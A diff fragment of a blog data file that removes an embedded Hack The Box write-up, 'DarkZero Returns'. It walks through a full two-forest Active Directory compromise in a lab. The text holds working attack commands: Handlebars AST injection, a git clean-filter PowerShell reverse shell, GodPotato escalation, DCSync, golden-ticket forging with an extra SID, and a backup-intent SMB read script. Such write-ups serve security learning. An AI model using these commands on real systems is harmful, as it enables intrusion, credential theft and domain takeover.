TREAT_AS_EXTERNAL forest trust to read root.txt off the second forest's domain controller using raw SMB2 backup semantics.\n\n        \n        \n          \n            Tools Used\n            \nnmap, Handlebars (manual AST crafting), hashcat, ssh, Chisel, proxychains4, faketime, curl (SPNEGO), Gitea Actions, impacket (ticketer, lookupsid, secretsdump, smbconnection), BloodHound, NetExec (nxc), GodPotato.\n\n          \n          \n            Credential Note\n            \nEvery credential-bearing screenshot in this write-up — hashcat, secretsdump, lookupsid (x2), and nxc smb/ldap — confirms josh's working password as Rangers1. ISP1337Hackers does not appear anywhere in the evidence; it is most likely the password used to self-register on the campaign-manager app in Stage 1, not josh's domain credential. Rangers1 is used throughout.\n\n          \n        \n      \n      \n- 01**Recon** — virtual host discovery, dzcampaigns.htb\n- 02**Initial access** — Handlebars AST injection (CVE-2026-58443) → RCE as darkzero\n- 03**Credential access** — MySQL bcrypt hash cracked with hashcat, reused on domain account josh\n- 04**Pivoting** — Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment\n- 05**Lateral movement** — Kerberos/SPNEGO auth to an internal Gitea instance\n- 06**CI/CD privesc — round 1** — reversed pull-request workflow trigger → shell as svc-runner\n- 07**CI/CD privesc — round 2** — Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea\n- 08**Local privesc** — GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\\SYSTEM\n- 09**Domain compromise** — DCSync of darkzero.ext, blocked at the forest-trust boundary\n- 10**Cross-forest attack** — SID-filtering bypass via a high-RID group nested in Backup Operators\n- 11**Objective** — raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb\n\n    \n\n    \n      \n        01\n        \n## Recon\n\n      \n      \n        \n```\nsudo nmap -p- --min-rate 10000 -n -Pn -oA nmap/darkzeroreturns_tcp.htb 10.129.59.3\n\n22/tcp open  ssh\n80/tcp open  http\n\nsudo nmap -sU -p 1-65535 --min-rate 10000 -oA nmap/darkzeroreturns_udp 10.129.59.3\n--Nothing--\n```\n\nPort 80 redirects to dzcampaigns.htb. The Ubuntu/nginx banner and general behavior suggested a domain-joined Linux box rather than a plain web server.\n\n```\necho \"10.129.59.3 dzcampaigns.htb\" | sudo tee -a /etc/hosts\n```\n\n      \n    \n\n      \n        02\n        \n## Initial access — Handlebars AST injection (CVE-2026-58443)\n\n      \n      \n        \n![img](images/darkzero-01.jpg)\n\n![img](images/darkzero-02.jpg)\n\n![img](images/darkzero-03.jpg)\n\nThe campaign manager's \"Custom Campaign Message\" field compiles user input with Handlebars:\n\n```\nif (customMessage) {\n  const compiled = Handlebars.compile(customMessage);\n  message = compiled();\n}\n```\n\nThe real bug is not classic SSTI — the JSON parser accepts an object in place of a string, and Handlebars treats that object as an already-parsed AST. Handing it a crafted syntax tree gets an unquoted value copied straight into generated JavaScript:\n\n```\n{\n  \"type\": \"Program\",\n  \"body\": [\n    {\n      \"type\": \"MustacheStatement\",\n      \"path\": {\"type\": \"PathExpression\", \"parts\": [\"lookup\"], \"original\": \"lookup\", \"depth\": 0, \"data\": false},\n      \"params\": [ {\"type\": \"PathExpression\", \"parts\": [], \"original\": \"this\", \"depth\": 0, \"data\": false}, ... ]\n    }\n  ]\n}\n```\n\nSending that object as `campaign_message` while updating a character yields RCE as darkzero. Reusable exploit: `exploit_hb_revshell.py`.\n\n      \n    \n\n      \n        03\n        \n## Cracking josh's password\n\n      \n      \n        \nMySQL was reachable from the RCE and held a bcrypt hash for a user named josh.\n\n```\nhashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt\n\n$2b$10$kX7QP3jPIQIShxJWV4a0HpO7UcdstuwLxPS1LhHPFPSceATiOKmVbK:Rangers1\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nThe same password works for josh's actual domain account (the Linux box is domain-joined to darkzero.ext):\n\n![img](images/darkzero-04.png)\n\n```\nssh josh@10.129.59.3\nPassword: Rangers1\n\nWelcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)\n...\nIPv4 address for eth0: 172.16.20.3\nLast login: ... from 172.16.20.1\njosh@SRV01:~$\n```\n\nThe eth0 address (172.16.20.3) confirms SRV01 has a leg into an internal, DNS-less segment (172.16.20.0/24) that isn't reachable from outside — that's the pivot target.\n\n      \n    \n\n      \n        04\n        \n## Pivoting — Chisel\n\n      \n      \n        \nOn SRV01, as josh:\n\n![img](images/darkzero-05.png)\n\n```\ncd /tmp\nwget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz\ngunzip chisel_1.10.1_linux_amd64.gz\nchmod +x chisel_1.10.1_linux_amd64\nsudo mv chisel_1.10.1_linux_amd64 /usr/local/bin/chisel\n# -> wget fails: 'Temporary failure in name resolution' (no outbound DNS)\n# -> sudo fails: josh is not in the sudoers file\n\n# workaround: fetch chisel on the attack box instead, then scp/http-serve it across,\n# and just chmod +x /tmp/chisel (no sudo/system install needed)\nchmod +x /tmp/chisel\n/tmp/chisel client 10.10.15.14:8888 R:socks\n\nclient: Connecting to ws://10.10.15.14:8888\nclient: Connected (latency 68.8355ms)\n```\n\nOn the attack box:\n\n![img](images/darkzero-06.png)\n\n![img](images/darkzero-07.png)\n\n```\nwget https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz\ngunzip chisel_1.11.8_linux_amd64.gz\nchmod +x chisel_1.11.8_linux_amd64\nsudo mv chisel_1.11.8_linux_amd64 /usr/local/bin/chisel\n\n/usr/local/bin/chisel server --reverse --port 8888\n\nserver: Reverse tunnelling enabled\nserver: Fingerprint tlb99dh2w63sCuOTvOX1gngA21MX8NPA3YAKSOYS3NM=\nserver: Listening on http://0.0.0.0:8888\nserver: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening\n```\n\nWith the reverse SOCKS proxy up on 127.0.0.1:1080, proxychains4 (pointed at that SOCKS5 listener) routes traffic into 172.16.20.0/24. An fping/nmap sweep through the tunnel turns up DC02.darkzero.ext (172.16.20.2) and DC01.darkzero.htb (172.16.20.1) — the second, HTB-side forest, added to /etc/hosts.\n\n      \n    \n\n      \n        05\n        \n## Kerberos against internal Gitea\n\n      \n      \n        \nPort 3000 on DC02 is an internal Gitea instance, reachable only through the tunnel and only via Kerberos/SPNEGO — no local auth is exposed. A kinit for josh (against DARKZERO.EXT) plus faketime (to correct clock skew across the tunnel, which Kerberos won't tolerate) gets a usable ticket:\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' kinit josh@DARKZERO.EXT\nklist\n```\n\n![img](images/darkzero-08.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -s \\\n  \"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks\" \\\n  | python3 -m json.tool\n```\n\nThe response lists prior workflow_runs, several already showing `event: pull_request_review_comment`, `workflow_id: foothold.yml`, `status: success` — evidence the same CI trust-confusion primitive had been exercised before this run.\n\n      \n    \n\n      \n        06\n        \n## The reversed pull request (CI/CD, round 1)\n\n      \n      \n        \nGitea Actions here trusts the operation, not the requester's underlying push rights. Forking the repo gives full push rights on the fork; a workflow that fires on `pull_request_review_comment` (instead of a plain push) plants an SSH key for the runner's real account when a PR review comment lands on a PR into the protected upstream repo:\n\n```\n# 1. kinit as josh\n# 2. create/reuse DarkZero/pwn-fork (fork of DarkZero/DarkZero-Campaigns)\n# 3. upload a pull_request_review_comment workflow (foothold.yml) to the fork\n# 4. create a fresh commit on fork/main\n# 5. open a normal PR from the fork into DarkZero/DarkZero-Campaigns:main via the Gitea API\n# 6. trigger it by posting a PR review COMMENT (not a push)\n# 7. wait for /tmp/p138_from_runner.txt to confirm the runner executed the fork's workflow\n\nGITEA='http://gitea.darkzero.ext:3000'\n# ... full script: exploit_gitea_pr_reverse.sh\n```\n\nThe workflow, once triggered, has the runner drop an SSH key readable by josh and copy the user flag / Kerberos material into a location the runner account (svc-runner) can reach.\n\n![img](images/darkzero-09.png)\n\n![img](images/darkzero-10.png)\n\n```\nnc -zv 10.129.59.3 22\nssh -i /tmp/dzr_key svc-runner@10.129.59.3\n```\n\n![img](images/darkzero-11.png)\n\n```\nsvc-runner@SRV01:~$ ls -la /etc/gitea-runner/\nsvc-runner@SRV01:~$ ls -la /tmp/krb5cc_gitea\n-rw------- 1 svc-runner root 79 May 20 23:33 svc-runner.keytab\n-rw------- 1 svc-runner domain users 1584 Jul 26 04:01 /tmp/krb5cc_gitea\n\nsvc-runner@SRV01:~$ klist -c /tmp/krb5cc_gitea\nDefault principal: svc-runner@DARKZERO.EXT\nValid starting          Expires                 Service principal\n07/26/2026 04:01:23     07/26/2026 14:01:23     krbtgt/DARKZERO.EXT@DARKZERO.EXT\n```\n\n![img](images/darkzero-12.png)\n\n```\nssh -i /tmp/dzr_key svc-runner@10.129.59.3 'id; whoami; cat /home/svc-runner/user.txt'\n\nuid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)\nsvc-runner\n```\n\n      \n    \n\n      \n        07\n        \n## The .git. trick (CI/CD, round 2 — CVE-2026-22547)\n\n      \n      \n        \nGitea's template-repository generation is vulnerable to a Windows path-normalization bug: setting a generated repo's description to \".git.\" causes the expanded template path to collide with the real .git directory once Windows trims the trailing dot, letting a malicious Git config — including a clean filter — get planted inside the generated repository's real .git folder.\n\n![img](images/darkzero-13.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X PATCH \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"template\":true}' \\\n  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template\n```\n\n![img](images/darkzero-14.png)\n\n```\ncat > /tmp/malicious_config <<EOF\n[filter \"pwn\"]\n    clean = powershell.exe -NoProfile -NonInteractive -EncodedCommand $PS_RS_B64\n    smudge = cat\n    required = true\nEOF\n\nPS_RS='$client = New-Object System.Net.Sockets.TCPClient(\"172.16.20.3\",4444); ...'\nPS_RS_B64=$(echo -n \"$PS_RS\" | iconv -t UTF-16LE | base64 -w0)\n\nFILE_SHA=$(KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -s \\\n  \"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config?ref=main\" \\\n  | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"sha\"])')\n\nCONTENT=$(base64 -w0 /tmp/malicious_config)\n\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X PUT \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"content\\\":\\\"$CONTENT\\\",\\\"branch\\\":\\\"main\\\",\\\"message\\\":\\\"update payload\\\",\\\"sha\\\":\\\"$FILE_SHA\\\"}\" \\\n  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/contents/${REPO_DESCRIPTION}/config\n```\n\n![img](images/darkzero-15.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"owner\":\"darkzero-ext_josh\",\"name\":\"configproof3\",\"description\":\".git.\",\"private\":true,\"git_content\":true}' \\\n  http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/configproof-template/generate\n```\n\nWhen Gitea's on-host runner initializes the generated repo, the planted clean filter fires and the base64-encoded PowerShell callback executes on the Windows host, landing a shell as svc-gitea.\n\n![img](images/darkzero-16.png)\n\n![img](images/darkzero-17.png)\n\n      \n    \n\n      \n        08\n        \n## GodPotato → SYSTEM\n\n      \n      \n        \n![img](images/darkzero-18.png)\n\n```\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe\n```\n\n![img](images/darkzero-19.png)\n\n```\nscp -i /tmp/dzr_key /tmp/GodPotato.exe svc-runner@10.129.59.3:/tmp/GodPotato.exe\n```\n\n![img](images/darkzero-20.png)\n\n```\nPS C:\\...\\gitea-configproof34146342436> whoami /all\nPS C:\\...\\gitea-configproof34146342436> Invoke-WebRequest -UseBasicParsing -Uri \"http://172.16.20.3:8000/GodPotato.exe\" -OutFile \"C:\\Windows\\Temp\\gp.exe\"\n```\n\n![img](images/darkzero-21.png)\n\n```\nC:\\Windows\\Temp\\gp.exe -cmd \"cmd /c whoami\"\n...\n[+] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] PID: 652  Token: 0x748  User: NT AUTHORITY\\SYSTEM  ImpersonationLevel: Impersonation\n[+] Find system Token: True\n[+] CurrentUser: NT AUTHORITY\\SYSTEM\n\nSet-Content -Encoding ASCII C:\\Windows\\Temp\\addda.cmd 'net group \"Domain Admins\" josh /add /domain'\nC:\\Windows\\Temp\\gp.exe -cmd \"cmd.exe /c C:\\Windows\\Temp\\addda.cmd\"\n...\nC:\\Windows\\System32>net group \"Domain Admins\" josh /add /domain\nThe command completed successfully.\n```\n\nsvc-gitea holds SeImpersonatePrivilege. GodPotato abuses it via a DCOM/OXID resolver trick to impersonate NT AUTHORITY\\SYSTEM, then adds josh directly to Domain Admins.\n\n      \n    \n\n      \n        09\n        \n## DCSync — and the forest-trust wall\n\n      \n      \n        \nConfirming access as a domain admin before going further:\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q nxc smb 172.16.20.2 -u josh -p 'Rangers1' -d darkzero.ext\n\nSMB  172.16.20.2  445  DC02  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None)\nSMB  172.16.20.2  445  DC02  [+] darkzero.ext\\josh:Rangers1 (Pwn3d!)\n```\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \\\n  impacket-secretsdump 'darkzero.ext/josh:Rangers1@172.16.20.2' -just-dc\n```\n\nDomain Admin on darkzero.ext (the internal forest) is complete here — but root.txt lives on DC01.darkzero.htb, the other, HTB-side forest, connected only by a one-way TREAT_AS_EXTERNAL trust. SID history isn't honored across that trust by default, so a forged golden ticket for darkzero.ext doesn't carry over on its own.\n\n      \n    \n\n      \n        10\n        \n## SID-filtering bypass\n\n      \n      \n        \nBloodHound's own resolver choked over the proxychains tunnel, so impacket-lookupsid and `nxc ldap --groups` covered the same ground manually.\n\n![img](images/darkzero-22.png)\n\n![img](images/darkzero-23.png)\n\n```\npip install bloodhound --break-system-packages\n```\n\n![img](images/darkzero-24.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \\\n  impacket-lookupsid 'darkzero.ext/josh:Rangers1@172.16.20.2' | head -5\n\nDomain SID is: S-1-5-21-2850783758-1231244658-2051857529\n```\n\n![img](images/darkzero-25.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \\\n  impacket-lookupsid 'darkzero.ext/josh:Rangers1@172.16.20.1' 2>&1 | head -10\n\nDomain SID is: S-1-5-21-2899195410-1848524783-1547768515\n500: darkzero\\Administrator (SidTypeUser)\n512: darkzero\\Domain Admins (SidTypeGroup)\n...\n1603: darkzero\\Infrastructure Administrators (SidTypeGroup)   <-- high-RID custom group\n```\n\n![img](images/darkzero-26.png)\n\n```\nKRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q \\\n  nxc ldap 172.16.20.1 -u josh -p 'Rangers1' -d darkzero.ext --groups\n\nBackup Operators   1 member   'Backup Operators can override security restrictions for the sole purpose of backing up or restoring files'\n```\n\nTREAT_AS_EXTERNAL filters most foreign SIDs at the trust boundary, but not uniformly — the custom, high-RID group Infrastructure Administrators (RID 1603) on the HTB-side forest is nested inside Backup Operators and survives the filter, carrying real privilege across the trust.\n\n### Forging the cross-realm ticket\n\n![img](images/darkzero-27.png)\n\n```\nfaketime '+7 hours' impacket-ticketer \\\n  -aeskey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe \\\n  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \\\n  -domain darkzero.ext \\\n  -user-id 500 \\\n  -groups 513,512,520,518,519 \\\n  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \\\n  Administrator\n\n# -aeskey is krbtgt's aes256 key, recovered from the STEP 9 secretsdump\n# -extra-sid is the Infrastructure Administrators (Backup Operators) SID from DC01\n# -> Saving ticket in Administrator.ccache\n```\n\n![img](images/darkzero-28.png)\n\n```\ncat > /tmp/dzr-both.conf <<'EOF'\n[libdefaults]\n    default_realm = DARKZERO.EXT\n    dns_lookup_realm = false\n    dns_lookup_kdc = false\n    rdns = false\n    udp_preference_limit = 1\n    forwardable = true\n[realms]\n    DARKZERO.EXT = { kdc = dc02.darkzero.ext }\n    DARKZERO.HTB = { kdc = dc01.darkzero.htb }\n[domain_realm]\n    darkzero.ext = DARKZERO.EXT\n    darkzero.htb = DARKZERO.HTB\nEOF\n```\n\n![img](images/darkzero-29.png)\n\n![img](images/darkzero-30.png)\n\n```\nexport KRB5_CONFIG=/tmp/dzr-both.conf\nexport KRB5CCNAME=/tmp/infraforge/combo.ccache\n\nfind /tmp -iname 'Administrator.ccache' 2>/dev/null\nmkdir -p /tmp/infraforge\ncp /tmp/Administrator.ccache /tmp/infraforge/combo.ccache\n\nfaketime '+7 hours' proxychains4 -q kvno cifs/dc01.darkzero.htb@DARKZERO.HTB\ncifs/dc01.darkzero.htb@DARKZERO.HTB: kvno = 4\n```\n\nRequesting the SPN for DC01 while KRB5CCNAME points at the forged darkzero.ext ticket forces Kerberos to walk the cross-realm referral, producing a genuine cross-realm CIFS ticket for DC01 that still carries the forged Backup Operators membership.\n\n      \n    \n\n      \n        11\n        \n## Reading root.txt with backup semantics\n\n      \n      \n        \nBackup Operators isn't Domain Admin — an ordinary SMB read/list can still come back Access Denied. The privilege only activates when a client explicitly opens the file with FILE_OPEN_FOR_BACKUP_INTENT, which normal tools (including stock smbclient) don't set. A small custom script using impacket.smbconnection sets that flag directly:\n\n![img](images/darkzero-31.png)\n\n```\ncat > /tmp/smb_backup_read.py <<'EOF'\n#!/usr/bin/env python3\nfrom impacket.smbconnection import SMBConnection\nfrom impacket.smb3structs import (\n    FILE_READ_DATA, FILE_READ_ATTRIBUTES,\n    FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,\n    FILE_NON_DIRECTORY_FILE, FILE_OPEN_FOR_BACKUP_INTENT,\n    FILE_OPEN, FILE_ATTRIBUTE_NORMAL,\n)\nimport sys\n\nhost, path = sys.argv[1], sys.argv[2]\nsmb = SMBConnection(host, '172.16.20.1')\nsmb.kerberosLogin('Administrator', '', 'DARKZERO.EXT', '', '', '', '172.16.20.1')\n\nraw = smb._SMBConnection\ntree_id = raw.connectTree('C$')\nfile_id = raw.create(\n    tree_id, path,\n    FILE_READ_DATA | FILE_READ_ATTRIBUTES,\n    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,\n    FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT,\n    FILE_OPEN, FILE_ATTRIBUTE_NORMAL,\n)\nprint(raw.read(tree_id, file_id, 0, 4096))\nraw.close(tree_id, file_id)\nEOF\n\nfaketime '+7 hours' proxychains4 -q python3 /tmp/smb_backup_read.py dc01.darkzero.htb '\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt'\n```\n\nroot.txt, read straight off DC01 — full compromise of both forests: a forged golden ticket, a cross-realm CIFS ticket, and a raw SMB2 read with backup semantics.\n\n      \n    \n\n    \n      \n## Lessons Learned\n\n      \n- Escaping template output doesn't help if the attacker controls the compiler's input — the bug was accepting a pre-parsed AST at all.\n- Read-only source access plus a CI runner is a privilege escalation primitive when the CI system trusts the operation, not the requester's rights.\n- Windows path normalization is real attack surface — a string inert on Linux can collide with a protected path once Windows trims it.\n- SeImpersonatePrivilege on a service account is basically SYSTEM waiting to happen.\n- SID filtering across a forest trust is a spectrum — TREAT_AS_EXTERNAL changes which SIDs survive, and a custom group with a high RID is a legitimate way through.\n- Backup Operators need backup semantics — the privilege is inert until a client explicitly asks for it via FILE_OPEN_FOR_BACKUP_INTENT.\n\n    \n\n    \n      Amine Ziani · Hack The Box: DarkZero Returns · Flags redacted per HTB policy",
-                    "date": "2026-07-29T23:14:00.867Z",
-                    "published": true,
-                    "icon": ""
-                },
-                {
                     "id": "mry0rohbft2g7hczzg7",
                     "title": "Fireflow",
                     "category": "HTB",
@@ -5480,7 +4587,7 @@ nmap -sC -sV 10.10.10.x
                     "icon": ""
                 }
             ],
-            "_exported": 1785366840910
+            "_exported": 1785366948125
         }; // @@DEFAULTS_END@@
 
         // ============================================================
